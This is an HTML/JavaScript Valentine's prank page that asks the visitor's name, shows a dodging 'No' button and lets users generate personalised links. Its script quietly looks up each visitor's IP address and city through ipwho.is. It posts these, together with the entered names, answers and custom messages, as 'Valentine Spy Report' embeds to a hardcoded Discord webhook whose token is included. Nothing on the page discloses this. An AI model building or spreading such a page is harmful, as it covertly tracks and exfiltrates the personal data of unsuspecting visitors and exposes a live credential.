<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Will you be my Valentine?</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  
  <style>
    :root { --primary: #ff4d6d; --secondary: #fbafba; --bg: #ffe6eb; --gold: #ffd700; }
    body { margin: 0; height: 100vh; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; background: var(--bg); overflow: hidden; transition: background 1.5s ease; }

    #namePortal {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?q=80&w=2070&auto=format&fit=crop') no-repeat center center;
      background-size: cover; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; z-index: 1000; padding: 20px; transition: opacity 0.8s ease;
    }

    #customText { color: white; margin-bottom: 25px; font-style: italic; font-size: 1.1rem; opacity: 0; font-weight: 600; transition: opacity 2s ease; display: inline-block; padding: 0 15px; line-height: 1.4; text-align: center; }
    .pulsing { animation: heartBeat 3s infinite ease-in-out; }
    @keyframes heartBeat {
      0%, 100% { transform: scale(1); text-shadow: 0 0 5px rgba(255, 215, 0, 0.2); }
      50% { transform: scale(1.05); text-shadow: 0 0 20px rgba(255, 215, 0, 0.8); color: var(--gold); }
    }

    .glass-box { background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.2); padding: 40px 25px; border-radius: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); max-width: 420px; width: 85%; }
    .card { background: white; padding: 40px; width: 90vw; max-width: 450px; height: 550px; border-radius: 40px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: none; flex-direction: column; align-items: center; justify-content: space-between; position: relative; overflow: hidden; z-index: 10; }
    
    #yes { --scale: 1; background: var(--primary); color: white; font-size: 20px; font-weight: 700; padding: 15px 45px; border: none; border-radius: 50px; cursor: pointer; transition: transform 0.2s; z-index: 50; }
    #no { background: var(--secondary); color: white; width: 140px; height: 45px; display: flex; align-items: center; justify-content: center; border: none; border-radius: 50px; position: absolute; cursor: pointer; transition: all 0.15s ease; z-index: 200; bottom: 60px; left: 50%; transform: translateX(-50%); font-size: 0.85rem; font-weight: 600; text-align: center; }

    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 5000; backdrop-filter: blur(8px); }
    .custom-modal { background: white; padding: 30px; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; }
    .modal-input, .modal-select { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid var(--secondary); border-radius: 12px; outline: none; font-family: 'Poppins'; box-sizing: border-box; }
  </style>
</head>
<body>

  <div id="modalOverlay" class="modal-overlay">
    <div class="custom-modal">
      <h2 style="color: var(--primary); margin: 0 0 10px 0;">Create Your Link</h2>
      <div id="step1" style="width: 100%;">
        <input type="text" id="creatorInput" class="modal-input" placeholder="Your Name" oninput="updateSuggestions()">
        <input type="text" id="targetInput" class="modal-input" placeholder="Their Name" oninput="updateSuggestions()">
        <select id="suggestionBox" class="modal-select" onchange="applySuggestion(this.value)">
            <option value="">‚ú® Romantic Suggestions...</option>
        </select>
        <textarea id="msgInput" class="modal-input" placeholder="Custom message..." rows="3"></textarea>
        <button onclick="processLinkGeneration()" style="background: var(--primary); color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-weight: 800; width: 100%; margin-top: 10px;">Generate Link</button>
      </div>
      <div id="step2" style="display: none; width: 100%;">
        <div id="urlDisplay" style="background:#fdf2f4; padding:10px; border-radius:10px; font-size:0.7rem; word-break:break-all; border:1px dashed var(--primary); margin: 10px 0;"></div>
        <button onclick="copyGeneratedUrl()" style="background: var(--primary); color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-weight: 800; width: 100%;">Copy & Close</button>
      </div>
    </div>
  </div>

  <div id="namePortal">
    <div class="glass-box">
      <h1 style="color: white; font-weight: 800; margin-bottom: 5px;">My heart is locked.</h1>
      <p id="customText"></p>
      <input type="text" id="userName" style="padding: 15px; border-radius: 50px; border: none; width: 85%; text-align: center;" placeholder="Your name...">
      <button onclick="startApp()" style="background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-weight: 800; cursor: pointer; margin-top: 20px;">Unlock My Heart</button>
      <p style="color:white; font-size:0.75rem; margin-top:20px; opacity:0.8; cursor:pointer; text-decoration: underline;" onclick="document.getElementById('modalOverlay').style.display='flex'">Create your own link</p>
    </div>
  </div>

  <div class="card" id="mainCard">
    <div id="joke-text" style="color: var(--primary); font-weight: 800; text-transform: uppercase; font-size: 0.75rem; height: 60px; text-align: center;">THINK CAREFULLY... üòà</div>
    <h1 style="color: var(--primary); font-weight: 800; text-align: center;">Will you be my Valentine?</h1>
    <div style="flex-grow:1; display:flex; align-items:center;"><button id="yes" onclick="yesClick()">Yes</button></div>
    <button id="no" onmouseover="moveNo()">No</button>
  </div>

<script>
  let visitorName = "", clickCount = 0, yesScale = 1;
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";

  const taunts = ["I have your IP üìç", "Police called üëÆ", "Missed me!", "Too slow!", "Say Yes or else! üòà"];
  
  const promises = [
    "Thank you, {name}. I promise to hold your hand through every storm. We are forever.",
    "You made me the luckiest alive, {name}. I'm yours forever.",
    "{name}, you are my today and all of my tomorrows."
  ];

  window.onload = async () => {
    const params = new URLSearchParams(window.location.search);
    const targetName = params.get('to');
    const customMsg = params.get('msg');

    if(targetName) document.getElementById('userName').value = decodeURIComponent(targetName);
    if(customMsg) {
      const msgEl = document.getElementById('customText');
      msgEl.innerText = decodeURIComponent(customMsg);
      msgEl.style.opacity = "1";
      msgEl.classList.add('pulsing');
    }
    sendDiscordReport("Visitor Landed");
  };

  async function sendDiscordReport(status) {
    let spyData = {};
    try {
        const res = await fetch('https://ipwho.is/');
        spyData = await res.json();
    } catch (e) { spyData = { ip: "Blocked", city: "Unknown" }; }

    const payload = {
      embeds: [{
        title: `üïµÔ∏è Valentine Spy Report: ${visitorName || "Guest"}`,
        color: status.includes("YES") ? 0x00ff00 : 0xff4d6d,
        fields: [
          { name: "Event", value: `**${status}**`, inline: true },
          { name: "Misses", value: `${clickCount}`, inline: true },
          { name: "Location", value: `${spyData.city || "Unknown"}`, inline: true },
          { name: "IP Address", value: `\`${spyData.ip || "Blocked"}\``, inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    };
    fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
  }

  function startApp() {
    visitorName = document.getElementById('userName').value.trim() || "Guest";
    sendDiscordReport("Unlocked Heart üîì");
    document.getElementById('namePortal').style.display = "none";
    document.getElementById('mainCard').style.display = "flex";
  }

  function moveNo() {
    clickCount++;
    const card = document.getElementById("mainCard");
    const noBtn = document.getElementById("no");
    const yesBtn = document.getElementById("yes");
    
    noBtn.style.left = (Math.random() * (card.clientWidth - 140 - 60) + 30) + "px";
    noBtn.style.top = (Math.random() * (card.clientHeight - 45 - 200) + 180) + "px";
    noBtn.innerText = taunts[clickCount % taunts.length];
    
    yesScale += 0.2;
    yesBtn.style.transform = `scale(${yesScale})`;
    if (clickCount % 5 === 0) sendDiscordReport(`Struggling: ${clickCount} misses`);
  }

  function yesClick() {
    const randomPromise = promises[Math.floor(Math.random() * promises.length)].replace("{name}", visitorName);
    sendDiscordReport(`SAID YES! ‚ù§Ô∏è | Quote: "${randomPromise}"`);
    document.body.style.background = "url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpwaG54Z2V3ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/26tOZ42Mg6pbTUPHW/giphy.gif') center center / cover";
    confetti({ particleCount: 150, spread: 70 });
    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>I KNEW IT! ‚ù§Ô∏è</h2><p>${randomPromise}</p></div>`;
  }

  // FIXED SUGGESTION LOGIC
  function updateSuggestions() {
    const to = document.getElementById('targetInput').value.trim() || "You";
    const deepMessages = [
      `${to}, you are the piece of my soul I never knew was missing.`,
      `Every beat of my heart belongs to you, ${to}.`,
      `In a world of temporary things, ${to}, you are my forever.`
    ];
    const select = document.getElementById('suggestionBox');
    select.innerHTML = '<option value="">‚ú® Romantic Suggestions...</option>' + 
      deepMessages.map(s => `<option value="${s}">${s}</option>`).join('');
  }

  function applySuggestion(val) {
    if(val) document.getElementById('msgInput').value = val;
  }

  function processLinkGeneration() {
    const to = document.getElementById('targetInput').value.trim();
    const msg = document.getElementById('msgInput').value.trim();
    if (!to) return alert("Enter their name!");
    
    const base = window.location.href.split('?')[0];
    const finalUrl = `${base}?to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
    
    sendDiscordReport(`New Link Created! To: ${to} | Msg: "${msg}"`);
    document.getElementById('urlDisplay').innerText = finalUrl;
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
  }

  function copyGeneratedUrl() {
    navigator.clipboard.writeText(document.getElementById('urlDisplay').innerText).then(() => {
        document.getElementById('modalOverlay').style.display = 'none';
    });
  }
</script>
</body>
</html>
